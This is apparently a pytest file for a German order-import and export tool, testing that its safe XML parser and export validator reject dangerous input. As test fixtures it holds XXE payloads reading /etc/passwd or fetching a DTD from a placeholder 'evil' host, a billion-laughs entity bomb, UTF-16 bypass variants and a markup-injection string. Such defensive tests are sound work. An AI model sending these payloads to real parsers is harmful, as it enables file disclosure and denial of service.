"""XML: XXE, externe Entitäten, Entity-Expansion, DOCTYPE, Bomben, Umgehung per UTF-16."""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from icware_auftragsimport.export.lexware.adapter import LexwareExportAdapter
from icware_auftragsimport.export.validator import ExportValidator
from icware_auftragsimport.security.safe_xml import UnsafeXmlError, parse_xml
from support import EXPORT_PROFILE, approved_order

LAUGHS = b"""<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>
<lolz>&lol3;</lolz>"""
XXE = (
    b"""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>"""
)
PARAMETER = (
    b"""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % p SYSTEM "http://evil/x.dtd"> %p;]><x/>"""
)
EXTERNAL_DTD = b"""<?xml version="1.0"?><!DOCTYPE x SYSTEM "http://evil/x.dtd"><x/>"""


@pytest.mark.parametrize(
    "data",
    [
        LAUGHS,
        XXE,
        PARAMETER,
        EXTERNAL_DTD,
        XXE.decode().encode("utf-16"),
        XXE.decode().replace("UTF-8", "UTF-16").encode("utf-16-le"),
        b"<x>" + b"\x00" + b"</x>",
        b"<x>" * 10 + b"a" * 2000,
    ],
)
def test_dangerous_xml_is_rejected(data: bytes) -> None:
    with pytest.raises(UnsafeXmlError):
        parse_xml(data, max_bytes=1500)


def test_harmless_xml_is_parsed() -> None:
    assert (
        parse_xml(b"<?xml version='1.0' encoding='ISO-8859-1'?><a><![CDATA[x & y]]></a>").text
        == "x & y"
    )


def test_validator_rejects_utf16_doctype_bypass() -> None:
    validator = ExportValidator(LexwareExportAdapter().spec)
    findings = validator.check_xml(XXE.decode().encode("utf-16"), "UTF-8")
    assert findings and all(f.severity.value == "error" for f in findings)


@pytest.mark.parametrize("notation", ["cdata", "entities"])
def test_injected_markup_stays_data_in_export(notation: str) -> None:
    adapter = LexwareExportAdapter()
    note = "</REMARK><EVIL>x</EVIL> <!DOCTYPE y [<!ENTITY z 'a'>]> ]]> &ent; \" '"
    order = approved_order(note=note)
    prepared = adapter.prepare(
        order, EXPORT_PROFILE, now=datetime(2026, 1, 1, tzinfo=UTC), number="AI-1"
    )
    assert prepared.document is not None
    xml = adapter.render(prepared.document, "UTF-8", notation=notation)
    result = ExportValidator(adapter.spec).validate(
        prepared, xml=xml, file_name=None, encoding="UTF-8"
    )
    assert result.errors() == ()
    root = parse_xml(xml)
    remarks = [e.text for e in root.iter() if e.tag.endswith("REMARK") and e.get("type") == "order"]
    assert remarks == [note]
